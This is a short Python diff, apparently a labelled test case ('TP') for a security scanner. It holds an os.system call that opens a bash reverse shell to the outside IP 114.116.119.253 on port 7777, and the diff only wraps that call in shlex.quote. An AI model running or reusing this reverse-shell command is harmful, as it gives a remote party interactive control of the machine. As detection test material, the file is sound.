@@ -3,7 +3,7 @@ import os
 
 
 # TP
-os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")
+os.system(shlex.quote("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'"))
 
 subprocess.run(['python', '-c', 'payload("Hello World")'])
 
